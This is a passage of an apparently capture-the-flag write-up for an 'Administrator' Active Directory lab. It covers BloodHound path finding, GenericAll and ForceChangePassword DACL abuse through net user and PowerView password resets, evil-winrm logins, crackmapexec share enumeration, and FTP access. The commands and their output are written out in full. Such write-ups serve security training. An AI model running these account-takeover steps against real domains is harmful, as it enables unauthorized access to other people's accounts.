SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator/bloodhound]
+└─$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 184
+drwxr-xr-x 2 chengw chengw  4096 Jan  7 23:25 .
+drwxr-xr-x 3 chengw chengw  4096 Jan  7 23:21 ..
+-rw-r--r-- 1 chengw chengw    74 Jan  7 23:25 20250107232443_computers.json
+-rw-r--r-- 1 chengw chengw 27939 Jan  7 23:25 20250107232443_containers.json
+-rw-r--r-- 1 chengw chengw  4366 Jan  7 23:25 20250107232443_domains.json
+-rw-r--r-- 1 chengw chengw  4416 Jan  7 23:25 20250107232443_gpos.json
+-rw-r--r-- 1 chengw chengw 91522 Jan  7 23:25 20250107232443_groups.json
+-rw-r--r-- 1 chengw chengw  1844 Jan  7 23:25 20250107232443_ous.json
+-rw-r--r-- 1 chengw chengw 28783 Jan  7 23:25 20250107232443_users.json</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f7807697d9ed180359aba2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f780258489ea2e1ee2a798" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The next step is to launch the Neo4J server and the BloodHound GUI:</span></span></p></div><ol class="NumberedListWrapper"><li id="https://www.notion.so/1770b98a88f7800f96a7c4648d6f9eeb" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sudo neo4j console</code></span><span class="SemanticString">. It starts the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">neo4j</code></span><span class="SemanticString"> server, and a local HTTP link can be found in the command output.</span></span><pre id="https://www.notion.so/f6e3c20bc5f34cad8dcdc9f4fd8c52ee" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> sudo neo4j console                           
+
+Directories in use:
+home:         /usr/share/neo4j
+config:       /usr/share/neo4j/conf
+logs:         /etc/neo4j/logs
+plugins:      /usr/share/neo4j/plugins
+import:       /usr/share/neo4j/import
+data:         /etc/neo4j/data
+certificates: /usr/share/neo4j/certificates
+licenses:     /usr/share/neo4j/licenses
+run:          /var/lib/neo4j/run
+Starting Neo4j.
+2025-01-07 13:00:37.421+0000 INFO  Starting...
+2025-01-07 13:00:37.736+0000 INFO  This instance is ServerId{a76e318b} (a76e318b-b2b6-4fe3-b0a3-ceb47dd6300a)
+2025-01-07 13:00:38.686+0000 INFO  ======== Neo4j 4.4.26 ========
+2025-01-07 13:00:41.098+0000 INFO  Initializing system graph model for component &#x27;security-users&#x27; with version -1 and status UNINITIALIZED
+2025-01-07 13:00:41.103+0000 INFO  Setting up initial user from defaults: neo4j
+2025-01-07 13:00:41.104+0000 INFO  Creating new user &#x27;neo4j&#x27; (passwordChangeRequired=true, suspended=false)
+2025-01-07 13:00:41.116+0000 INFO  Setting version for &#x27;security-users&#x27; to 3
+2025-01-07 13:00:41.120+0000 INFO  After initialization of system graph model component &#x27;security-users&#x27; have version 3 and status CURRENT
+2025-01-07 13:00:41.125+0000 INFO  Performing postInitialization step for component &#x27;security-users&#x27; with version 3 and status CURRENT
+2025-01-07 13:00:41.459+0000 INFO  Bolt enabled on localhost:7687.
+2025-01-07 13:00:42.236+0000 INFO  Remote interface available at </span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>http://localhost:7474/</span></mark></span><span class="SemanticString"><span>
+2025-01-07 13:00:42.241+0000 INFO  id: 741EC451083D9897905DE7F2F4A41CB94BC94B4DD769C789F16890188744330E
+2025-01-07 13:00:42.241+0000 INFO  name: system
+2025-01-07 13:00:42.241+0000 INFO  creationDate: 2025-01-07T13:00:39.388Z
+2025-01-07 13:00:42.241+0000 INFO  Started.</span></span></span></code></pre></li><li id="https://www.notion.so/1770b98a88f7804bbf19cc20201d64b8" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString">Open the link in a browser and log in to the Neo4J server. The default username and password is both </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">neo4j</code></span><span class="SemanticString">.</span></span><div id="https://www.notion.so/ea8a6b82d8f146c7858a957133e7d79e" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fd4c24793-7521-4ace-adb9-1bcd65648f80%2Fimage.png?width=707.984375&amp;table=block&amp;id=ea8a6b82-d8f1-46c7-858a-957133e7d79e"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fd4c24793-7521-4ace-adb9-1bcd65648f80%2Fimage.png?width=707.984375&amp;table=block&amp;id=ea8a6b82-d8f1-46c7-858a-957133e7d79e" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></li><li id="https://www.notion.so/1770b98a88f780e8ba38f2da934c8833" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString">In another terminal session, run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">bloodhound</code></span><span class="SemanticString"> to open the BloodHound GUI. Click on “Upload data” and upload all 7 JSON files created earlier.</span></span><div id="https://www.notion.so/31fc2b5309b24ab6873129a45f4d2160" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F52cd3a23-89e1-427e-bb52-2411daf279ab%2Fimage.png?width=707.984375&amp;table=block&amp;id=31fc2b53-09b2-4ab6-8731-29a45f4d2160"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F52cd3a23-89e1-427e-bb52-2411daf279ab%2Fimage.png?width=707.984375&amp;table=block&amp;id=31fc2b53-09b2-4ab6-8731-29a45f4d2160" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></li></ol><div id="https://www.notion.so/1770b98a88f78043a2c5e977ffc9feb6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now BloodHound has ingested all the data and is ready for us to use.</span></span></p></div><div id="https://www.notion.so/1770b98a88f780e4a28cd2b3410a6cd6" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F19ec986b-1d76-43b3-9545-9ffcfaca627e%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-80e4-a28c-d2b3410a6cd6"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F19ec986b-1d76-43b3-9545-9ffcfaca627e%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-80e4-a28c-d2b3410a6cd6" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1770b98a88f780488763ce6df081c6ed" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f780e4aca2cac75c9bee6e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Path Finding:</strong></span></span></p></div><div id="https://www.notion.so/1770b98a88f780e1b30feb24453aad40" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll start from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">olivia</code></span><span class="SemanticString">, as it’s the only account I have control of. The user can be selected from the search bar.</span></span></p></div><div id="https://www.notion.so/1770b98a88f78070bf7dcde28d6dcb5e" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5c81340e-8055-4ead-907e-3508725b90b0%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-8070-bf7d-cde28d6dcb5e"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5c81340e-8055-4ead-907e-3508725b90b0%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-8070-bf7d-cde28d6dcb5e" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1770b98a88f780779859e2c5f3bf68f4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The tab on the left provides an overview of the selected node, displaying properties like the object ID and the number of group membership it has.</span></span></p></div><div id="https://www.notion.so/1770b98a88f780698b0fdaa7cbcac037" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Most importantly, it shows if there’s any direct outbound control on other objects. These are objects that the user can take control of via some permissions or misoconfigurations.</span></span></p></div><div id="https://www.notion.so/1770b98a88f7800d806fe608674119c2" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F9fad10f0-b937-44a2-a689-ee4c32478438%2Fimage.png?width=474&amp;table=block&amp;id=1770b98a-88f7-800d-806f-e608674119c2"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F9fad10f0-b937-44a2-a689-ee4c32478438%2Fimage.png?width=474&amp;table=block&amp;id=1770b98a-88f7-800d-806f-e608674119c2" style="width:474px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1770b98a88f780b2ba1fec0d5bcf4f73" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Clicking on it shows an attack graph. This indicates that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">olivia</code></span><span class="SemanticString"> can move laterally to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">michael</code></span><span class="SemanticString"> by abusing its </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">GenericAll</code></span><span class="SemanticString"> DACL. We’ll discuss this in more details below.</span></span></p></div><div id="https://www.notion.so/1770b98a88f780a1ba16f354f1fb24be" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1dde92bb-75b0-46a3-9cbb-bf9c5a473089%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-80a1-ba16-f354f1fb24be"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1dde92bb-75b0-46a3-9cbb-bf9c5a473089%2Fimage.png?width=707.984375&amp;table=block&amp;id=1770b98a-88f7-80a1-ba16-f354f1fb24be" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1770b98a88f780bd92efc1291b4fadbd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Knowing that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">michael</code></span><span class="SemanticString"> is reachable, I’ll check his outbound control and discovers it can force change </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">benjamin</code></span><span class="SemanticString">&#x27;s password, which can also be abused for lateral movement.</span></span></p></div><div id="https://www.notion.so/1770b98a88f78052b120fcd62ca7adce" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5a99a106-1a28-4cb1-99e3-761366c85ad1%2Fimage.png?width=707.96875&amp;table=block&amp;id=1770b98a-88f7-8052-b120-fcd62ca7adce"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5a99a106-1a28-4cb1-99e3-761366c85ad1%2Fimage.png?width=707.96875&amp;table=block&amp;id=1770b98a-88f7-8052-b120-fcd62ca7adce" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1770b98a88f780088100daaa11882812" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">benjamin</code></span><span class="SemanticString"> does not have outbound control over any objects, meaning that with the current privileges and information, we cannot move any further. However, the user is in the Share Moderators group, which may provide extra permissions on FTP and SMB. This makes the user itself a high-value target.</span></span></p></div><div id="https://www.notion.so/1770b98a88f780df93e1d9d967f13e6a" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F73be9fb7-9171-437e-aabe-4df842f9f3a1%2Fimage.png?width=707.96875&amp;table=block&amp;id=1770b98a-88f7-80df-93e1-d9d967f13e6a"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F73be9fb7-9171-437e-aabe-4df842f9f3a1%2Fimage.png?width=707.96875&amp;table=block&amp;id=1770b98a-88f7-80df-93e1-d9d967f13e6a" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1770b98a88f780658ab1f12de7369fd8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To summarize, this is the attack path to reach </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">benjamin</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/1770b98a88f780c08173d4d3893ba3c7" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fbe23199b-01cb-4a74-b635-272995c83c5f%2Fimage.png?width=707.953125&amp;table=block&amp;id=1770b98a-88f7-80c0-8173-d4d3893ba3c7"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fbe23199b-01cb-4a74-b635-272995c83c5f%2Fimage.png?width=707.953125&amp;table=block&amp;id=1770b98a-88f7-80c0-8173-d4d3893ba3c7" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1770b98a88f78092835fe0379b82c146" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f7801ba21ef3531135cbd0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">DACL Abuse — </strong></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">GenericAll</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><div id="https://www.notion.so/1770b98a88f780889edaea90db16258d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A Discretionary Access Control List (DACL) is a key component of Windows security, governing what actions users and groups can and cannot perform on an object. It consists of multiple Access Control Entries (ACEs), each explicitly defining the rights granted or denied to a specific user or group. These rights ranges from basic permissions like read, write and execute to more advanced ones such as modifying permissions and changing ownership. </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.thehacker.recipes/ad/movement/dacl/">This post</a></span><span class="SemanticString"> provides a more in-depth look at DACLs and how they can be abused.</span></span></p></div><div id="https://www.notion.so/1770b98a88f780a28cb7f9a87e7ab9e4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In this scenario, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">olivia</code></span><span class="SemanticString"> is granted </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">GenericAll</code></span><span class="SemanticString"> rights on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">michael</code></span><span class="SemanticString">. This essentially gives </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">olivia</code></span><span class="SemanticString"> full control of his account, including the ability to force change his password without knowledge of the current one. The attack could be done simply by running </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">net user</code></span><span class="SemanticString"> to change his password:</span></span></p></div><pre id="https://www.notion.so/1770b98a88f780bda3dbd6e23c97ae66" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\olivia\Documents&gt;</span></mark></span><span class="SemanticString"><span> net user michael letmein123 /domain
+
+The command completed successfully.</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f7809b8888c196b3012f85" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f780d0b77cdf8c6f26e16b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the new password, I can log in via WinRM as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">michael</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1770b98a88f780a6b3d1c27f75b62057" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> evil-winrm -u michael -p &#x27;letmein123&#x27; -i administrator.htb                 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\michael\Documents&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+administrator\michael</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f7803e842ffc0179b661ea" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f780ad8a48e856ac3a4937" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">DACL Abuse — </strong></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">ForceChangePassword</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><div id="https://www.notion.so/1770b98a88f7803b9e3bdafbd5ea0f3f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">michael</code></span><span class="SemanticString"> has </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ForceChangePassword</code></span><span class="SemanticString"> rights on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">benjamin</code></span><span class="SemanticString">. As the name implies, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">michael</code></span><span class="SemanticString"> can also force change his password similar to the above step. However, the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">net user</code></span><span class="SemanticString"> command failed here for some reasons.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f7804b9a08cc52a57c5352" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\michael\Documents&gt;</span></mark></span><span class="SemanticString"><span> net user benjamin letmeinagain123 /domain
+
+net.exe : System error 5 has occurred.
+    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+Access is denied.</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f780119444ed4d477107fe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Luckily there are multiple ways to force a password change. </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.hackingarticles.in/abusing-ad-dacl-forcechangepassword/">This post</a></span><span class="SemanticString"> showed the same can be done using </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">PowerView</a></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/1770b98a88f780d3ae68e29ba7ee2704" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\michael\Documents&gt;</span></mark></span><span class="SemanticString"><span> upload PowerView.ps1
+                                        
+Info: Uploading /home/ch3ng/machines/administrator/PowerView.ps1 to C:\Users\michael\Documents\PowerView.ps1
+                                        
+Data: 1027036 bytes of 1027036 bytes copied
+                                        
+Info: Upload successful!
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\michael\Documents&gt;</span></mark></span><span class="SemanticString"><span> Import-Module .\PowerView.ps1
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\michael\Documents&gt;</span></mark></span><span class="SemanticString"><span> $NewPassword = ConvertTo-SecureString &#x27;letmeinagain123&#x27; -AsPlainText -Force
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\michael\Documents&gt;</span></mark></span><span class="SemanticString"><span> Set-DomainUserPassword -Identity &#x27;benjamin&#x27; -AccountPassword $NewPassword</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f7800f9778f750b077a413" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">benjamin</code></span><span class="SemanticString"> is not in the Remote Management Users group, so I cannot use it to log in to WinRM. Instead, I can list the SMB shares with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">crackmapexec</code></span><span class="SemanticString">, proving the password change has taken effect.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f780a6be3de33736c18e47" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> crackmapexec smb 10.129.85.158 -u &#x27;benjamin&#x27; -p &#x27;letmeinagain123&#x27; --shares
+
+SMB         10.129.85.158   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.129.85.158   445    DC               [+] administrator.htb\benjamin:letmeinagain123 
+SMB         10.129.85.158   445    DC               [+] Enumerated shares
+SMB         10.129.85.158   445    DC               Share           Permissions     Remark
+SMB         10.129.85.158   445    DC               -----           -----------     ------
+SMB         10.129.85.158   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.85.158   445    DC               C$                              Default share
+SMB         10.129.85.158   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.85.158   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.85.158   445    DC               SYSVOL          READ            Logon server share</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f7801fabf0ff942b0111b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f7802aaf09c82580734a5a" class="Divider"></div><h3 id="https://www.notion.so/1770b98a88f780d08c77d0c601932249" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1770b98a88f780d08c77d0c601932249"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">benjamin</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/1770b98a88f780678208eb46b70f133f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP21 — FTP:</strong></span></span></p></div><div id="https://www.notion.so/1770b98a88f780a0a06fd7cfdff1bc92" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The FTP share can also be now accessed with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">benjamin</code></span><span class="SemanticString">&#x27;s credentials, and it contains a single </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.psafe3</code></span><span class="SemanticString"> file.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f78069bb32f394734082ef" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> ftp 10.129.85.158
+
+Connected to 10.129.85.158.
+220 Microsoft FTP Service
+Name (10.129.85.158:ch3ng): benjamin
+331 Password required
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>ftp&gt;</span></mark></span><span class="SemanticString"><span> dir
+
+229 Entering Extended Passive Mode (|||55341|)
+125 Data connection already open; Transfer starting.
+10-05-24  08:13AM                  952 Backup.psafe3
